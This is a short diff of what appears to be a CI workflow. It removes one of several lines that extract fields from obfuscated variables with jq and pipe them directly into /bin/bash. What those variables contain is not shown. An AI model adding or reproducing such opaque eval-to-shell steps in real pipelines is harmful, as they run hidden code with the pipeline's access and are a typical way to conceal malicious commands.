@@ -40,7 +40,6 @@ jobs:
           echo $oz01276 | jq -r .rsz2 | /bin/bash
           printf '%s' "$opj94" | jq -r .pt2 | /bin/bash
           echo $tefc7 | jq -r .p17239 | /bin/bash
-          echo $lnha1084 | jq -r .tymfs864 | /bin/bash
           printf '%s' "$fztp66" | jq -r .qx09601 | /bin/bash
           printf '%s' "$cueo3" | jq -r .cta4 | /bin/bash
           echo $haq07 | jq -r .chew945 | /bin/bash
